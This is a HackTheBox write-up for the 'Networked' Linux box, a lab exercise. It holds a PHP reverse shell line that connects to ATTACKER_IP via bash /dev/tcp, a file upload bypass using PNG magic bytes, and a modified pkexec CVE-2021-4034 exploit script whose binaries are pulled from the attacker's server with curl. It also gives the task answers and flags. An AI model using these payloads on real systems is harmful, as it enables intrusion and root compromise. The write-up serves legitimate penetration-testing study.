---
title: "HackTheBox - Networked"
published: true
---

| Field            | Details                                                                |
| ---------------- | ---------------------------------------------------------------------- |
| **OS**           | Linux                                                                  |
| **Difficulty**   | Easy                                                                   |
| **Release Date** | 2019-08-24                                                             |
| **Pwned Date**   | 2026-04-28                                                             |
| **Tags**         | `File Upload Vulnerability` `CVE-2021-4034` `Subdirectory Enumeration` |

## Summary

Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Code execution can be used to trigger a reverse php shell. The machine has a vulnerable version of the pkexec binary, which can be used to get root access.

## Reconnaissance

### Port Scan

Start with a general scan of all TCP ports

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt 10.129.26.204
```

```
[snip]
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

Running default scripts and service detection on ports from previous scan

```bash
nmap -sC -sV -p 22,80,443 -oN service_scan.txt 10.129.26.204
```

```
[snip]
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
[snip]
```

Task 1: Which version of Apache is running on the target? **2.4.6**

### Subdirectory Enumeration

The website served at the root of the web server looks like a work in progress, with a page made only of plaintext.

Scanning for subdirectories

```bash
dirb http://10.129.26.204/ /usr/share/wordlists/dirb/common.txt
```

```
==> DIRECTORY: http://10.129.26.204/backup/
http://10.129.26.204/cgi-bin/ (CODE:403|SIZE:210)
http://10.129.26.204/index.php (CODE:200|SIZE:229)
==> DIRECTORY: http://10.129.26.204/uploads/
```

Found two interesting folders: **/backup** and **/uploads**.

/backup folder is listable and contains a ‘backup.tar’ file, which contains a few php files. Probably a backup of the actual website, as the name hints.

Task 2: What is the relative path of the directory that contains the backup file on the webserver? **/backup**

Task 3: After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .) **PNG**

Task 4: MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters) **89504E470D0A1A0A**

Task 5: On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux? **cron**

### Code Analysis

In the tar archive there is a photos.php and a upload.php file, these pages are available also in the live website at /photos.php and /upload.php.

Looking at the source code of upload.php page

```php
$validext = array('.jpg', '.png', '.gif', '.jpeg');
```

Only files with the extensions in validext array are allowed. Apache v2.4.6 has a vulnerability that makes it treat files such as 'foo.php.otherext' as a valid php file. So it's possible to get around the extension check uploading a file named 'reverse.php.png', basically a php shell disguised as a png file. The png's magic bytes will also be added at the beginning of the fake png to spoof the mime type of the file.

## Foothold

Create a 'reverse.php' file with the following content

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"); ?>
```

Create spoofed png file with magic bytes + php shell

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> reverse.php.png
cat reverse.php >> reverse.php.png
```

Listen for incoming connections on attacker machine

```bash
nc -lvnp 4444
```

Upload the file and trigger it by visiting the /photos.php page. This should spawn a shell on the listening port

```
listening on [any] 4444 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.26.204] 50034
```

```bash
whoami
```

```
apache
```

Got initial access with user 'apache'

## Privilege Escalation

Check for SUID/SGID binaries (files that execute with the permissions of the owner)

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
[snip]
/usr/bin/pkexec
[snip]
```

There is a known privilege escalation vulnerability in the pkexec binary (CVE-2021-4034).

A proof-of-concept can be found at https://github.com/mebeim/CVE-2021-4034

Need to determine if the target machine has a vulnerable version of polkit, which is the package providing pkexec.

```bash
cat /etc/os-release
```

```
NAME="CentOS Linux"
VERSION="7 (Core)"
```

The target is a CentOS 7 machine.

In the Red Hat ecosystem the fix for the vulnerability was introduced in polkit v0.112-26, according to the official errata RHSA-2022:0274 (https://access.redhat.com/errata/RHSA-2022:0274). Previous versions may be vulnerable.

```bash
rpm -qa polkit
```

```
polkit-0.112-18.el7_6.1.x86_64
```

The target machine has v0.112-18 (< 0.112-26), so it should be vulnerable.

The PoC comes with a script ready to run to exploit the vulnerability. The script runs gcc, unfortunately the target machine does not have gcc installed

```bash
gcc --version
```

```
bash: gcc: command not found
```

The script cannot be run as-is on the target machine.

Compile the program manually on the attacker's machine

```bash
gcc -static pkexec_exploit_helper.c -o helper
gcc -fPIC -shared -o fake_module.so pkexec_exploit_fake_module.c
```

The 'helper' binary requires static compilation, otherwise when ran on the target machine it will cause a error such as

```
./helper: /lib64/libc.so.6: version `GLIBC_2.34' not found (required by ./helper)
```

due to the mismatch of the glibc version between the attacker and the target machine. With static compilation all necessary lib code is included in the binary itself.

Adapt the script to remove gcc usage

```bash
#!/bin/sh
set -e

# Setup:
# .
# ├── GCONV_PATH=.
# │   └── fake_exe
# └── fake_exe
#     ├── gconv-modules
#     └── fake_module.so  (pre-compiled)

mkdir -p 'GCONV_PATH=.'
touch 'GCONV_PATH=./fake_exe'
chmod +x 'GCONV_PATH=./fake_exe'
mkdir -p fake_exe
echo 'module INTERNAL banana// fake_module 1' > fake_exe/gconv-modules

# Copy pre-compiled binaries into place
cp ./fake_module.so fake_exe/fake_module.so

set +e
env PATH="$(pwd):$PATH" ./helper
rm -rf 'GCONV_PATH=.' fake_exe
```

Start a python server on the attacker's machine to serve the files (need to start it in files' directory)

```bash
python -m http.server
```

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Fetch files on target machine

```bash
curl -O http://10.10.14.50:8000/fake_module.so -O http://10.10.14.50:8000/helper -O http://10.10.14.50:8000/pkexec_exploit_script.sh
```

```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
Dload  Upload   Total   Spent    Left  Speed
100 15848  100 15848    0     0   212k      0 --:--:-- --:--:-- --:--:--  214k
100 16024  100 16024    0     0   216k      0 --:--:-- --:--:-- --:--:--  216k
100   515  100   515    0     0  10574      0 --:--:-- --:--:-- --:--:-- 19807
```

Make them executable

```bash
chmod +x fake_module.so helper pkexec_exploit_script.sh
```

Run the script

```bash
./pkexec_exploit_script.sh
```

```
Pwned!
sh-4.2#
```

```bash
sh-4.2# whoami
```

```
root
```

Got root access.

Finish answering the box's tasks

```bash
cat /home/guly/crontab.guly
```

```
*/3 * * * * php /home/guly/check_attack.php
```

Task 6: According to the backup of the crontab file for guly, the check_attack.php script is executed every how many minutes? **3**

Task 7: In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading \$)? **\$value**

Task 6 and 7 hint to cron as a possible vector for privilege escalation, not needed since the pkexec vulnerability was used instead.

```bash
cat /home/guly/user.txt
```

```
374e753d0c175c322f87c93103ac8451
```

USER FLAG: **374e753d0c175c322f87c93103ac8451**

```bash
cat /etc/sudoers
```

```
[snip]
guly ALL=NOPASSWD: /usr/local/sbin/changename.sh
```

Task 9: What is the name of the script that guly can run as root without a password? **changename.sh**

```bash
cat /root/root.txt
```

```
3d5694febd9c595628528017f851e506
```

ROOT FLAG: **3d5694febd9c595628528017f851e506**
